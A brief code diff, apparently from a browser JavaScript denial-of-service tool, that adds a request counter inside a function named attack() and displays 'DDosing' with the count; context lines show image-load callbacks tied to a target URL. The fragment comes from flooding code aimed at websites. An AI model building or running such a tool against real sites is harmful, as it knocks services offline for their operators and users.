@@ -8,7 +8,8 @@ function attack() {
 	
 	
 	
-    document.body.innerHTML= `DDosing ${dn}`;
+   dn = dn + 1
+   document.body.innerHTML= `DDosing ${dn}`;
   
 
                     img.onload = function () { onSuccess(rID); }; // TODO: it may never happen if target URL is not an image... // but probably can be fixed with different methods
